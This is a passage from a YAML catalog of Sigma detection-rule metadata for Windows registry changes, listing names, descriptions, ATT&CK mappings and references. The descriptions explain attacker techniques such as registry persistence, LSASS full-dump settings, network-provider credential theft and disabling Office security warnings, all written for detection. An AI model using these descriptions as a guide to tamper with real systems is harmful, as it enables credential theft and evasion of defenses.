  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://twitter.com/dottor_morte/status/1544652325570191361
  - https://raw.githubusercontent.com/RiccardoAncarani/talks/master/F-Secure/unorthodox-lateral-movement.pdf
  false_positives:
  - Unknown
  notes: ''
- detection_id: 44a22d59-b175-4f13-8c16-cbaef5b581ff
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_file_association_exefile.yml
  name: New File Association Using Exefile
  description: Detects the abuse of the exefile handler in new file association. Used
    for bypass of security products.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://twitter.com/mrd0x/status/1461041276514623491
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4fee3d51-8069-4a4c-a0f7-924fcaff2c70
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_filefix_typedpath_commands.yml
  name: FileFix - Command Evidence in TypedPaths
  description: 'Detects commonly-used chained commands and strings in the most recent
    ''url'' value of the ''TypedPaths'' key, which could be indicative of a user being
    targeted by the FileFix technique.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1204.004
  tags:
  - attack.execution
  - attack.t1204.004
  time_window: ''
  references:
  - https://x.com/russianpanda9xx/status/1940831134759506029
  - https://mrd0x.com/filefix-clickfix-alternative/
  - https://www.scpx.com.au/2025/11/16/decades-old-finger-protocol-abused-in-clickfix-malware-attacks/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 833ef470-fa01-4631-a79b-6f291c9ac498
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_hangs_debugger_persistence.yml
  name: Add Debugger Entry To Hangs Key For Persistence
  description: Detects when an attacker adds a new "Debugger" value to the "Hangs"
    key in order to achieve persistence which will get invoked when an application
    crashes
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://persistence-info.github.io/Data/wer_debugger.html
  - https://www.hexacorn.com/blog/2019/09/20/beyond-good-ol-run-key-part-116/
  false_positives:
  - This value is not set by default but could be rarly used by administrators
  notes: ''
- detection_id: f10ed525-97fe-4fed-be7c-2feecca941b1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_hhctrl_persistence.yml
  name: Persistence Via Hhctrl.ocx
  description: Detects when an attacker modifies the registry value of the "hhctrl"
    to point to a custom binary
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://persistence-info.github.io/Data/hhctrl.html
  - https://www.hexacorn.com/blog/2018/04/23/beyond-good-ol-run-key-part-77/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 5df86130-4e95-4a54-90f7-26541b40aec2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_hidden_extention.yml
  name: Registry Modification to Hidden File Extension
  description: Hides the file extension through modification of the registry
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1137
  tags:
  - attack.persistence
  - attack.t1137
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1112/T1112.md#atomic-test-1---modify-registry-of-current-user-profile---cmd
  - https://unit42.paloaltonetworks.com/ransomware-families/
  - https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?name=TrojanSpy%3aMSIL%2fHakey.A
  false_positives:
  - Administrative scripts
  notes: ''
- detection_id: 5a5152f1-463f-436b-b2f5-8eceb3964b42
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_hide_file.yml
  name: Displaying Hidden Files Feature Disabled
  description: 'Detects modifications to the "Hidden" and "ShowSuperHidden" explorer
    registry values in order to disable showing of hidden files and system files.

    This technique is abused by several malware families to hide their files from
    normal users.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1564.001
  tags:
  - attack.defense-evasion
  - attack.t1564.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1564.001/T1564.001.md#atomic-test-8---hide-files-through-registry
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5a93eb65-dffa-4543-b761-94aa60098fb6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_hide_function_user.yml
  name: Registry Hide Function from User
  description: Detects registry modifications that hide internal tools or functions
    from the user (malware like Agent Tesla, Hermetic Wiper uses this technique)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1564.001/T1564.001.md
  false_positives:
  - Legitimate admin script
  notes: ''
- detection_id: 5b16df71-8615-4f7f-ac9b-6c43c0509e61
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_hide_scheduled_task_via_index_tamper.yml
  name: Hide Schedule Task Via Index Value Tamper
  description: 'Detects when the "index" value of a scheduled task is modified from
    the registry

    Which effectively hides it from any tooling such as "schtasks /query" (Read the
    referenced link for more information about the effects of this technique)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562
  tags:
  - attack.defense-evasion
  - attack.t1562
  time_window: ''
  references:
  - https://blog.qualys.com/vulnerabilities-threat-research/2022/06/20/defending-against-scheduled-task-attacks-in-windows-environments
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 555155a2-03bf-4fe7-af74-d176b3fdbe16
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_hvci_disallowed_images.yml
  name: Driver Added To Disallowed Images In HVCI - Registry
  description: 'Detects changes to the "HVCIDisallowedImages" registry value to potentially
    add a driver to the list, in order to prevent it from loading.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://github.com/yardenshafir/conference_talks/blob/3de1f5d7c02656c35117f067fbff0a219c304b09/OffensiveCon_2023_Your_Mitigations_are_My_Opportunities.pdf
  - https://x.com/yarden_shafir/status/1822667605175324787
  false_positives:
  - Legitimate usage of this key would also trigger this. Investigate the driver being
    added and make sure its intended
  notes: ''
- detection_id: 3fd4c8d7-8362-4557-a8e6-83b29cc0d724
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_ie_security_zone_protocol_defaults_downgrade.yml
  name: IE ZoneMap Setting Downgraded To MyComputer Zone For HTTP Protocols
  description: 'Detects changes to Internet Explorer''s (IE / Windows Internet properties)
    ZoneMap configuration of the "HTTP" and "HTTPS" protocols to point to the "My
    Computer" zone. This allows downloaded files from the Internet to be granted the
    same level of trust as files stored locally.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://twitter.com/M_haggis/status/1699056847154725107
  - https://twitter.com/JAMESWT_MHT/status/1699042827261391247
  - https://learn.microsoft.com/en-us/troubleshoot/developer/browsers/security-privacy/ie-security-zones-registry-entries
  - https://www.virustotal.com/gui/file/339ff720c74dc44265b917b6d3e3ba0411d61f3cd3c328e9a2bae81592c8a6e5/content
  false_positives:
  - Unknown
  notes: ''
- detection_id: b888e3f2-224d-4435-b00b-9dd66e9ea1f1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_ime_non_default_extension.yml
  name: Uncommon Extension In Keyboard Layout IME File Registry Value
  description: 'Detects usage of Windows Input Method Editor (IME) keyboard layout
    feature, which allows an attacker to load a DLL into the process after sending
    the WM_INPUTLANGCHANGEREQUEST message.

    Before doing this, the client needs to register the DLL in a special registry
    key that is assumed to implement this keyboard layout. This registry key should
    store a value named "Ime File" with a DLL path.

    IMEs are essential for languages that have more characters than can be represented
    on a standard keyboard, such as Chinese, Japanese, and Korean.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://www.linkedin.com/pulse/guntior-story-advanced-bootkit-doesnt-rely-windows-disk-baranov-wue8e/
  false_positives:
  - IMEs are essential for languages that have more characters than can be represented
    on a standard keyboard, such as Chinese, Japanese, and Korean.
  notes: ''
- detection_id: 9d8f9bb8-01af-4e15-a3a2-349071530530
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_ime_suspicious_paths.yml
  name: Suspicious Path In Keyboard Layout IME File Registry Value
  description: 'Detects usage of Windows Input Method Editor (IME) keyboard layout
    feature, which allows an attacker to load a DLL into the process after sending
    the WM_INPUTLANGCHANGEREQUEST message.

    Before doing this, the client needs to register the DLL in a special registry
    key that is assumed to implement this keyboard layout. This registry key should
    store a value named "Ime File" with a DLL path.

    IMEs are essential for languages that have more characters than can be represented
    on a standard keyboard, such as Chinese, Japanese, and Korean.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://www.linkedin.com/pulse/guntior-story-advanced-bootkit-doesnt-rely-windows-disk-baranov-wue8e/
  false_positives:
  - Unknown
  notes: ''
- detection_id: d223b46b-5621-4037-88fe-fda32eead684
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_install_root_or_ca_certificat.yml
  name: New Root or CA or AuthRoot Certificate to Store
  description: Detects the addition of new root, CA or AuthRoot certificates to the
    Windows registry
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1490
  tags:
  - attack.impact
  - attack.t1490
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.004/T1553.004.md#atomic-test-6---add-root-certificate-to-currentuser-certificate-store
  - https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec
  false_positives:
  - Unknown
  notes: ''
- detection_id: ab567429-1dfb-4674-b6d2-979fd2f9d125
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_internet_explorer_disable_first_run_customize.yml
  name: Internet Explorer DisableFirstRunCustomize Enabled
  description: 'Detects changes to the Internet Explorer "DisableFirstRunCustomize"
    value, which prevents Internet Explorer from running the first run wizard the
    first time a user starts the browser after installing Internet Explorer or Windows.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/devil-bait/NCSC-MAR-Devil-Bait.pdf
  - https://unit42.paloaltonetworks.com/operation-ke3chang-resurfaces-with-new-tidepool-malware/
  - https://admx.help/?Category=InternetExplorer&Policy=Microsoft.Policies.InternetExplorer::NoFirstRunCustomise
  false_positives:
  - As this is controlled by group policy as well as user settings. Some false positives
    may occur.
  notes: ''
- detection_id: 8b9606c9-28be-4a38-b146-0e313cc232c1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_legalnotice_susp_message.yml
  name: Potential Ransomware Activity Using LegalNotice Message
  description: Detect changes to the "LegalNoticeCaption" or "LegalNoticeText" registry
    values where the message set contains keywords often used in ransomware ransom
    messages
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1491.001
  tags:
  - attack.impact
  - attack.t1491.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/5c1e6f1b4fafd01c8d1ece85f510160fc1275fbf/atomics/T1491.001/T1491.001.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3aff0be0-7802-4a7e-a4fa-c60c74bc5e1d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_lolbin_onedrivestandaloneupdater.yml
  name: Lolbas OneDriveStandaloneUpdater.exe Proxy Download
  description: 'Detects setting a custom URL for OneDriveStandaloneUpdater.exe to
    download a file from the Internet without executing any

    anomalous executables with suspicious arguments. The downloaded file will be in
    C:\Users\redacted\AppData\Local\Microsoft\OneDrive\StandaloneUpdaterreSignInSettingsConfig.json

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/OneDriveStandaloneUpdater/
  false_positives:
  - Unknown
  notes: ''
- detection_id: d6ce7ebd-260b-4323-9768-a9631c8d4db2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_lsa_disablerestrictedadmin.yml
  name: RestrictedAdminMode Registry Value Tampering
  description: 'Detects changes to the "DisableRestrictedAdmin" registry value in
    order to disable or enable RestrictedAdmin mode.

    RestrictedAdmin mode prevents the transmission of reusable credentials to the
    remote system to which you connect using Remote Desktop.

    This prevents your credentials from being harvested during the initial connection
    process if the remote server has been compromise

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/a8e3cf63e97b973a25903d3df9fd55da6252e564/atomics/T1112/T1112.md
  - https://social.technet.microsoft.com/wiki/contents/articles/32905.remote-desktop-services-enable-restricted-admin-mode.aspx
  false_positives:
  - Unknown
  notes: ''
- detection_id: 33efc23c-6ea2-4503-8cfe-bdf82ce8f719
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_lsass_usermode_dumping.yml
  name: Lsass Full Dump Request Via DumpType Registry Settings
  description: Detects the setting of the "DumpType" registry value to "2" which stands
    for a "Full Dump". Technique such as LSASS Shtinkering requires this value to
    be "2" in order to dump LSASS.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://github.com/deepinstinct/Lsass-Shtinkering
  - https://learn.microsoft.com/en-us/windows/win32/wer/collecting-user-mode-dumps
  - https://media.defcon.org/DEF%20CON%2030/DEF%20CON%2030%20presentations/Asaf%20Gilboa%20-%20LSASS%20Shtinkering%20Abusing%20Windows%20Error%20Reporting%20to%20Dump%20LSASS.pdf
  false_positives:
  - Legitimate application that needs to do a full dump of their process
  notes: ''
- detection_id: 28036918-04d3-423d-91c0-55ecf99fb892
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_net_cli_ngenassemblyusagelog.yml
  name: NET NGenAssemblyUsageLog Registry Key Tamper
  description: 'Detects changes to the NGenAssemblyUsageLog registry key.

    .NET Usage Log output location can be controlled by setting the NGenAssemblyUsageLog
    CLR configuration knob in the Registry or by configuring an environment variable
    (as described in the next section).

    By simplify specifying an arbitrary value (e.g. fake output location or junk data)
    for the expected value, a Usage Log file for the .NET execution context will not
    be created.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://bohops.com/2021/03/16/investigating-net-clr-usage-log-tampering-techniques-for-edr-evasion/
  false_positives:
  - Unknown
  notes: ''
- detection_id: e7b18879-676e-4a0e-ae18-27039185a8e7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_netsh_help_dll_persistence_susp_location.yml
  name: New Netsh Helper DLL Registered From A Suspicious Location
  description: 'Detects changes to the Netsh registry key to add a new DLL value that
    is located on a suspicious location. This change might be an indication of a potential
    persistence attempt by adding a malicious Netsh helper

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.007
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.007
  time_window: ''
  references:
  - https://www.ired.team/offensive-security/persistence/t1128-netsh-helper-dll
  - https://pentestlab.blog/2019/10/29/persistence-netsh-helper-dll/
  false_positives:
  - Unknown
  notes: ''
- detection_id: c90362e0-2df3-4e61-94fe-b37615814cb1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_netsh_helper_dll_potential_persistence.yml
  name: Potential Persistence Via Netsh Helper DLL - Registry
  description: 'Detects changes to the Netsh registry key to add a new DLL value.
    This change might be an indication of a potential persistence attempt by adding
    a malicious Netsh helper

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.007
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.007
  time_window: ''
  references:
  - https://www.ired.team/offensive-security/persistence/t1128-netsh-helper-dll
  - https://pentestlab.blog/2019/10/29/persistence-netsh-helper-dll/
  false_positives:
  - Legitimate helper added by different programs and the OS
  notes: ''
- detection_id: 60936b49-fca0-4f32-993d-7415edcf9a5d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_new_application_appcompat.yml
  name: New Application in AppCompat
  description: A General detection for a new application in AppCompat. This indicates
    an application executing for the first time on an endpoint.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: informational
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1204.002
  tags:
  - attack.execution
  - attack.t1204.002
  time_window: ''
  references:
  - https://github.com/OTRF/detection-hackathon-apt29/issues/1
  - https://github.com/OTRF/ThreatHunter-Playbook/blob/2d4257f630f4c9770f78d0c1df059f891ffc3fec/docs/evals/apt29/detections/1.A.1_DFD6A782-9BDB-4550-AB6B-525E825B095E.md
  false_positives:
  - This rule is to explore new applications on an endpoint. False positives depends
    on the organization.
  - Newly setup system.
  - Legitimate installation of new application.
  notes: ''
- detection_id: 0442defa-b4a2-41c9-ae2c-ea7042fc4701
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_new_network_provider.yml
  name: Potential Credential Dumping Attempt Using New NetworkProvider - REG
  description: Detects when an attacker tries to add a new network provider in order
    to dump clear text credentials, similar to how the NPPSpy tool does it
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1003
  tags:
  - attack.credential-access
  - attack.t1003
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/troubleshoot/windows-client/setup-upgrade-and-drivers/network-provider-settings-removed-in-place-upgrade
  - https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy
  false_positives:
  - Other legitimate network providers used and not filtred in this rule
  notes: ''
- detection_id: 3390fbef-c98d-4bdd-a863-d65ed7c610dd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_odbc_driver_registered.yml
  name: New ODBC Driver Registered
  description: Detects the registration of a new ODBC driver.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: low
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/
  false_positives:
  - Likely
  notes: ''
- detection_id: e4d22291-f3d5-4b78-9a0c-a1fbaf32a6a4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_odbc_driver_registered_susp.yml
  name: Potentially Suspicious ODBC Driver Registered
  description: Detects the registration of a new ODBC driver where the driver is located
    in a potentially suspicious location
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 9
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1003
  tags:
  - attack.credential-access
  - attack.persistence
  - attack.t1003
  time_window: ''
  references:
  - https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 1a5c46e9-f32f-42f7-b2bc-6e9084db7fbf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_office_access_vbom_tamper.yml
  name: Trust Access Disable For VBApplications
  description: Detects registry changes to Microsoft Office "AccessVBOM" to a value
    of "1" which disables trust access for VBA on the victim machine and lets attackers
    execute malicious macros without any Microsoft Office warnings.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://twitter.com/inversecos/status/1494174785621819397
  - https://www.mcafee.com/blogs/other-blogs/mcafee-labs/zloader-with-a-new-infection-technique/
  - https://securelist.com/scarcruft-surveilling-north-korean-defectors-and-human-rights-activists/105074/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: a5c7a43f-6009-4a8c-80c5-32abf1c53ecc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_office_disable_protected_view_features.yml
  name: Microsoft Office Protected View Disabled
  description: Detects changes to Microsoft Office protected view registry keys with
    which the attacker disables this feature.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md
  - https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/
  - https://yoroi.company/research/cyber-criminal-espionage-operation-insists-on-italian-manufacturing/
  - https://admx.help/HKCU/software/policies/microsoft/office/16.0/excel/security/protectedview
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 17e53739-a1fc-4a62-b1b9-87711c2d5e44
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_office_disable_python_security_warnings.yml
  name: Python Function Execution Security Warning Disabled In Excel - Registry
  description: 'Detects changes to the registry value "PythonFunctionWarnings" that
    would prevent any warnings or alerts from showing when Python functions are about
    to be executed.

    Threat actors could run malicious code through the new Microsoft Excel feature
    that allows Python to run within the spreadsheet.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://support.microsoft.com/en-us/office/data-security-and-python-in-excel-33cc88a4-4a87-485e-9ff9-f35958278327
  false_positives:
  - Unknown
  notes: ''
- detection_id: 63647769-326d-4dde-a419-b925cc0caf42
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_office_enable_dde.yml
  name: Enable Microsoft Dynamic Data Exchange
  description: Enable Dynamic Data Exchange protocol (DDE) in all supported editions
    of Microsoft Word or Excel.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1559.002
  tags:
  - attack.execution
  - attack.t1559.002
  time_window: ''
  references:
  - https://msrc.microsoft.com/update-guide/vulnerability/ADV170021
  false_positives:
  - Unknown
  notes: ''
- detection_id: 396ae3eb-4174-4b9b-880e-dc0364d78a19
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_office_outlook_enable_load_macro_provider_on_boot.yml
  name: Potential Persistence Via Outlook LoadMacroProviderOnBoot Setting
  description: Detects the modification of Outlook setting "LoadMacroProviderOnBoot"
    which if enabled allows the automatic loading of any configured VBA project/module
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
